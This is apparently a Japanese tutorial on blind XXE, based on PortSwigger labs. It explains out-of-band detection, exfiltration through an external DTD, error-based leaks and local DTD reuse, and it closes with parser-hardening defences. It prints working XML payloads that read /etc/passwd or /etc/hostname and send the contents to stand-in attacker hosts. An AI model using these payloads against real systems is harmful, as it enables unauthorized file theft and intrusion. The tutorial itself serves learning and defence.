## Blind XXEのラボ（OOB・外部DTD exfil）

この節では、**Blind XXE（盲目XXE）** を、PortSwigger Web Security Academy の解説記事と2つのラボを軸に、原理レベルで解説する。「盲目（blind）」とは、XXE（XML External Entity）の脆弱性そのものは存在するのに、**外部エンティティに読み込ませた値がHTTPレスポンス本文に一切現れない**状況を指す。つまり `<foo>&xxe;</foo>` のように単純に返させる古典的な手口が通じない。ここで主役になるのが **OOB（Out-of-Band、帯域外）通信** と **XMLパラメータエンティティ**、そして **外部DTD** を使った2段構えのデータ持ち出し（exfiltration）である。

本節はすべて防御・検知の理解を目的とする。ペイロードは自分の管理下にある学習用ラボ（PortSwiggerの練習環境など、明示的に許可された環境）でのみ用いること。実在サービスや本番環境への無許可の検証は行わない。

---

### なぜ「盲目」になるのか — 前提の整理

まず用語を噛み砕く。

- **XXE**: アプリがXMLを解析（パース）する際、XMLの仕様にある「外部エンティティ」機能が有効なままだと、攻撃者が仕込んだ `SYSTEM "file:///..."` や `SYSTEM "http://..."` によって、ローカルファイル読み取りやサーバ発の外部リクエスト（SSRF）を引き起こせる欠陥。
- **エンティティ（entity）**: XMLにおける「変数のようなもの」。`<!ENTITY xxe SYSTEM "file:///etc/passwd">` と宣言し、本文で `&xxe;` と書くと、パーサがそこをファイルの中身に置換しようとする。
- **sink（シンク）**: 攻撃者の入力が最終的に危険な形で解釈・実行される到達点。XXEのsinkは「外部エンティティを解決してURL/ファイルにアクセスするXMLパーサの内部処理」である。

**古典的（非盲目）XXE** は、`&xxe;` の展開結果がそのままレスポンスのどこか（在庫チェック結果、エラーの反映など）に出てくることを利用する。ところが実運用のアプリでは、

1. パース結果の一部（例：在庫数の数値）しか画面に返さない、
2. `&xxe;` が指す内容を出力に混ぜない、

といった作りが普通で、**値を直接読み出す経路が存在しない**。これが盲目XXEである。PortSwiggerは盲目XXEを「アプリはXXEインジェクションに対して脆弱だが、定義した外部エンティティの値をレスポンス内に返さない」ものと定義している。

盲目でも攻略できるのは、XXEが「データを返させる」だけでなく「**サーバに何らかの副作用（外部通信・エラー）を起こさせる**」力を持つからだ。この副作用を観測窓口にするのがOOBである。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 検知フェーズ①：通常エンティティによるOOB

最初の一手は、サーバに攻撃者管理下のドメインへHTTPリクエストを飛ばさせることだ。レスポンスに何も出なくても、**攻撃者のサーバ側でアクセスログ（DNSルックアップ＋HTTP）を観測**できれば、外部エンティティが解決されている＝XXEが生きている証拠になる。

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

これを宣言し、本文の適当なデータ値で `&xxe;` を参照させる。パーサが `&xxe;` を解決しようとして `http://f2g9j7hhkax.web-attacker.com` にアクセスするため、攻撃者はDNSクエリとHTTPリクエストの到来を確認できる。

**なぜOOBが観測窓口になるのか**: XMLパーサは外部エンティティのURLに対して実際にネットワークI/Oを行う（`http:` なら実HTTP、`file:` ならファイル読み込み）。レスポンス本文に値を返す経路がなくても、この「パーサが自発的に外へ出す通信」自体は攻撃者のインフラ側で観測できる。**アプリの出力に依存しない別チャネル**だから帯域外（out-of-band）と呼ぶ。

---

### 検知フェーズ②：パラメータエンティティで入力フィルタを回避

現実のアプリは素朴なXXE対策として「`<!ENTITY ... SYSTEM ...>` という**通常の外部エンティティ宣言を含むリクエストをブロック**する」入力検証を入れていることが多い。この場合、上記の通常エンティティ payload は弾かれる。

そこで **XMLパラメータエンティティ（parameter entity）** を使う。これはDTD（Document Type Definition、XML文書の構造定義部）**の内部でのみ**使える特殊なエンティティで、宣言・参照ともに `%` を使う。

```xml
<!-- パラメータエンティティの宣言 -->
<!ENTITY % myparameterentity "my parameter entity value" >

<!-- パラメータエンティティの参照 -->
%myparameterentity;
```

盲目XXEのOOB検知をパラメータエンティティで書くと次のようになる。

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

**なぜフィルタを回避できるのか**: 多くの単純なフィルタは `<!ENTITY name SYSTEM` のような**通常エンティティの字面**にマッチするよう書かれており、`<!ENTITY % name SYSTEM`（`%` 付き）を見落とす。加えて、パラメータエンティティはDTD処理という「より内側の文脈」で展開されるため、通常エンティティを禁じただけの防御をすり抜けやすい。パーサは `%xxe;` に到達した瞬間に `SYSTEM` のURLを解決しようとし、やはり外部通信が発生する。

---

### ラボ1：XMLパラメータエンティティによるOOB検知

> ラボ「Blind XXE with out-of-band interaction via XML parameter entities」

**設定**: 対象アプリの「Check stock（在庫確認）」機能がXMLをPOSTで受け取りパースする。このラボは意図的に、

- 予期しない値を画面に一切表示しない（＝盲目）、
- **通常の外部エンティティを含むリクエストをブロックする**、

という二重の制約を持つ。したがって古典的XXEもフェーズ①の通常エンティティも通らない。狙いは「パラメータエンティティでOOB相互作用（DNS/HTTP）を起こせることを示す」こと。データ持ち出しまでは要求されず、**脆弱性の存在確認（検知）**がゴールである。

**攻略の要点**（学習環境での手順）:

1. 商品ページで「Check stock」を押し、POSTリクエストを傍受する。ボディはXML（`stockCheck` 要素を含む）。
2. **XML宣言（`<?xml ...?>`）と `stockCheck` 要素の間**に、次の宣言を挿入する（`BURP-COLLABORATOR-SUBDOMAIN` は自分のOOB受信用サブドメインに置換）。

   ```xml
   <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
   ```

3. 送信後、OOB受信基盤（Burp Collaborator等）を「Poll now」で確認すると、アプリが payload を処理した結果としての **DNSルックアップとHTTPリクエスト**が届く。

**なぜ挿入位置がXML宣言と本文要素の間なのか**: `<!DOCTYPE ... [ ... ]>` の内部（内部サブセット）はDTDそのものであり、パラメータエンティティを宣言・参照できる唯一の場所だからだ。ここに置くことで、ルート要素 `stockCheck` の中身とは独立に、パーサがDTD処理段階で `%xxe;` を展開し外部通信を発生させる。

**技術的な核心**: パラメータエンティティ（`%` 前置）は、アプリが敷いた「通常の外部エンティティのブロック」をすり抜ける。直接のデータ出力ができないときでも、OOB相互作用の観測で脆弱性を確定できる。

> 出典: Lab: Blind XXE with out-of-band interaction via XML parameter entities — https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

---

### 持ち出しフェーズ：外部DTDによる2段構えの exfiltration

検知の次は、盲目のままファイル内容を実際に取り出す。鍵は「**攻撃者サーバ上に悪意あるDTDを置き**、それをパラメータエンティティで読み込ませる」ことだ。なぜ外部DTDが要るのかを、DTDの文法制約から説明する。

#### なぜ内部サブセットだけでは持ち出せないのか

やりたいのは概念的にこうだ：

```
（1）file:///etc/passwd を読んで %file に入れる
（2）その %file を URL に埋め込んだ別のエンティティを動的に定義する
     → <!ENTITY % exfil SYSTEM "http://attacker/?x=（%fileの中身）">
（3）%exfil を参照して attacker に中身付きでアクセスさせる
```

問題は（2）だ。**XMLの仕様では、内部サブセット（`<!DOCTYPE foo [ ... ]>` の内側）において、パラメータエンティティを「別の宣言のマークアップ内部」で参照することが許されていない**。`%file;` を「エンティティ宣言の中」で展開する、という入れ子の参照が内部DTDではできない。ところが**外部DTD（外部サブセット）ではこの制約が緩く、宣言内でのパラメータエンティティ参照が許される**。この文法上の非対称性こそが、外部DTDをホストする理由である。

#### 悪意ある外部DTDの実体

攻撃者が `http://web-attacker.com/malicious.dtd` として置くファイル：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

3つのパラメータエンティティが連鎖する：

- `%file`：`/etc/passwd` の中身を保持する。
- `%eval`：**別のエンティティ宣言を文字列として**保持する。`&#x25;` はパーセント記号 `%` の文字参照（数値実体参照）で、`<!ENTITY % exfiltrate SYSTEM '...'>` を表す。ここで `%` を直書きせず `&#x25;` とするのが決定的に重要（後述）。
- `%eval;` を参照した瞬間に、その中身が展開されて `exfiltrate` エンティティが**動的に定義**される。このとき URL 内の `%file;` が `/etc/passwd` の中身に置換される。
- 最後に `%exfiltrate;` を参照すると、パーサが `http://web-attacker.com/?x=（passwdの中身）` にアクセスし、**クエリ文字列に載った機密がそのまま攻撃者サーバのログに残る**。

#### 標的側に注入するXML

アプリのXMLには、この外部DTDを読み込ませる短い payload だけを入れる：

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

**なぜ `&#x25;`（`%`のエスケープ）が必要か**: `%eval` の値は「後で展開されたときに初めてエンティティ宣言として解釈されてほしい」文字列だ。もし `%` を直に書くと、外側のDTDを読み込む段階でパーサが先にパラメータ参照として解決しようとし、宣言のタイミングがずれて意図通りに動かない。`&#x25;` と書くことで「今は普通の文字として置いておき、`%eval;` が展開される瞬間に `%` として解釈させる」という**二段階の遅延評価**を成立させている。この遅延こそがOOB exfiltrationの心臓部である。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### ラボ2：悪意ある外部DTDでデータを持ち出す

> ラボ「Exploiting blind XXE to exfiltrate data using a malicious external DTD」

**設定**: 「Check stock」がXMLをパースするが結果は表示しない（盲目）。ゴールは **`/etc/hostname` の中身を持ち出す**こと。`/etc/passwd` ではなく `/etc/hostname` が標的なのは、後述する「改行問題」を避けるための現実的な選択である（短く1行の値なのでURLに載せやすい）。

**攻略の要点**（学習環境での手順）:

1. 攻撃者管理のホスティング（ラボでは「Exploit server」が提供される）に、以下の**外部DTD**を置く。`BURP-COLLABORATOR-SUBDOMAIN` は自分のOOB受信サブドメインに置換する。

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
   %eval;
   %exfil;
   ```

2. 「Check stock」のPOSTを傍受し、**XML宣言と `stockCheck` 要素の間**に次を挿入する。`YOUR-DTD-URL` は手順1でDTDを置いたURLに置換する。

   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
   ```

3. 送信すると、標的サーバは `%xxe;` で外部DTDを取得→ `%file` に `/etc/hostname` を読み込み→ `%eval;` で `exfil` を動的定義→ `%exfil;` で `http://（あなたのCollaborator）/?x=（hostnameの中身）` へアクセスする。OOB基盤のHTTPリクエストのクエリ `x=` に `/etc/hostname` の値が現れる。

**なぜ外部DTDに分離するのか（再掲の要点）**: 標的に直接注入する内部サブセットでは、宣言内でのパラメータエンティティ参照（`%eval` の中の `%file;`）が文法上禁止されている。ロジック本体を外部DTDへ逃がすことで、その制約のない外部サブセットとして評価させ、2段階展開を成立させる。標的に注入するのは「外部DTDを呼ぶ最小限の橋渡し」だけになる。

> 出典: Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD — https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

---

### 実戦上の落とし穴：改行・URLパーサの制約

OOB exfiltrationには実装依存の壁がある。PortSwiggerが明記する重要な制約：

- **一部のXMLパーサは、外部エンティティのURLに改行文字が含まれると拒否する**。`/etc/passwd` は複数行なので、その中身をURLに埋め込むと改行が混ざり、パーサがURLを不正とみなして失敗しうる。

対処は次の通り：

1. **改行を含まないファイルを狙う**：`/etc/hostname` のような1行の値なら問題が起きにくい（ラボ2がこれを標的にする理由）。
2. **FTPプロトコルを使う**：`http:` の代わりに `ftp://` を使うと、パーサやプロトコルの扱いの違いから複数行データを送れる場合がある。

これらは「なぜラボが `/etc/passwd` ではなく `/etc/hostname` を課題にするのか」の実務的背景であり、対象環境のパーサ実装（Javaの標準パーサ等）に強く依存する点に注意する。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 補完手法①：エラーベースXXE（OOB通信が塞がれているとき）

アプリからの外向き通信（egress）が遮断され、OOBが使えないこともある。その場合でも、**XMLパースエラーのメッセージがレスポンスに反映される**なら、エラー文言に機密を載せて漏らせる。

悪意ある外部DTD：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file` に `/etc/passwd` を読み込む。
- `%eval;` で `error` エンティティを動的定義。その値は **存在しないパス** `file:///nonexistent/（passwdの中身）` を指す。
- `%error;` を参照すると、そのファイルが開けずエラーになる。エラーメッセージにパス文字列＝機密が埋め込まれて出力される。

エラー出力の例：

```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...
```

**なぜ漏れるのか**: `file:///nonexistent/...` の `...` 部分はパーサにとって「開こうとしたファイルパス」であり、`FileNotFoundException` のメッセージがそのパス（＝ `/etc/passwd` の中身を連結した文字列）をそのまま含める。アプリが例外文言を画面に返す作りだと、機密が反射して見える。OOB通信を一切必要としない点が強み。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 補完手法②：ローカルDTDの再利用（外部DTDも読めないとき）

外向き通信が塞がれ、かつ**外部DTDのホスティングも読み込ませられない**厳しい状況では、標的サーバ上に**既に存在するローカルのDTDファイル**を悪用（再利用）してエラーベースを成立させる手がある。

まず、既知のローカルDTDが存在するかを確認する検知 payload：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

正常にパースできればそのファイルは存在する。エラーになれば無い、と切り分けられる（GNOME環境に多い `docbookx.dtd` などが手がかりになる）。

存在を確認できたら、そのローカルDTDが内部で定義しているパラメータエンティティを**上書き再定義**して悪用する、ハイブリッドDTD payload：

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error; '>
%local_dtd;
]>
```

**なぜこれが動くのか**: ローカルDTD `schema.dtd` は内部のどこかで `%custom_entity;` を参照している、という構造を利用する。攻撃者は内部サブセットで `custom_entity` を**先に再定義**しておき、`%local_dtd;` を読み込ませると、ローカルDTD側がその `custom_entity` を参照した瞬間に攻撃者の中身（エラーベースのロジック）が展開される。**内部サブセットの禁止事項（宣言内パラメータ参照）を、外部DTDが評価される文脈に肩代わりさせる**のが要点で、`&#x25;`（`%`）や `&#x26;#x25;`（`&#x25;` すなわち二重エスケープ）、`&#x27;`（シングルクォート `'`）といった文字参照で、展開の各段階を精密に遅延させている。実在サービスでの検証は行わず、仕組みの理解にとどめる。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind

---

### 攻撃の前提条件と影響（まとめ）

PortSwiggerが挙げる**成立条件**：

- アプリがXML入力を処理している。
- XMLパーサが外部エンティティの解決を有効にしている（安全な設定なら無効）。
- **エラーメッセージが返る**か、**ネットワーク相互作用が観測できる**（＝観測窓口がある）。
- OOB手法なら**外向き接続**が、ローカルDTD再利用なら**アクセス可能なローカルDTDファイル**が要る。

**影響**：機密ファイルへの不正アクセス、内部システム情報の漏えい、そしてSSRFを介したサーバ侵害の足がかり。盲目であっても、外部DTD／エラー／ローカルDTDのいずれかの窓口が開いていれば、実質的に任意ファイル読み取りに到達しうる点が脅威である。

---

### 防御：盲目XXEを断つ設計

盲目XXEも根本原因は通常のXXEと同じ「**外部エンティティ解決が有効なXMLパーサ**」であり、対策も共通する。

1. **外部エンティティ／DTDを完全に無効化する**（最重要）。多くのパーサは機能フラグで無効化できる。例（Java系）：
   - `DocumentBuilderFactory` / `SAXParserFactory` / `XMLInputFactory` で外部一般エンティティ・外部パラメータエンティティを無効化。
   - `http://apache.org/xml/features/disallow-doctype-decl` を `true` にして**DOCTYPE宣言そのものを禁止**するのが最も堅い（DTDを一切許さないため、パラメータエンティティも外部DTDも成立しなくなる）。
2. **外向き通信（egress）を制限する**：サーバから外部への任意HTTP/FTP/DNSを絞れば、OOB exfiltrationと外部DTD読み込みを弱められる（ただしエラーベースやローカルDTD再利用は塞げないので、これは多層防御の一枚）。
3. **詳細なパースエラーをユーザーに返さない**：エラーベースXXEの窓口を閉じる。例外の生メッセージを画面に出さない。
4. **入力の字面フィルタに依存しない**：「`<!ENTITY` をブロック」といった対症療法は、パラメータエンティティ（`%`）や文字参照エスケープで回避されるため、単独では不十分。パーサ設定での無効化が本筋である。

盲目XXEのラボが教えるのは、**「値が返らない＝安全」ではない**という一点だ。OOB・外部DTD・エラー・ローカルDTDという複数の観測チャネルがあるため、防御は「攻撃者に窓口を与えない（DOCTYPE/外部エンティティを無効化する）」というパーサ設定側の根本対策に集約される。

> 出典: What is blind XXE? — https://portswigger.net/web-security/xxe/blind
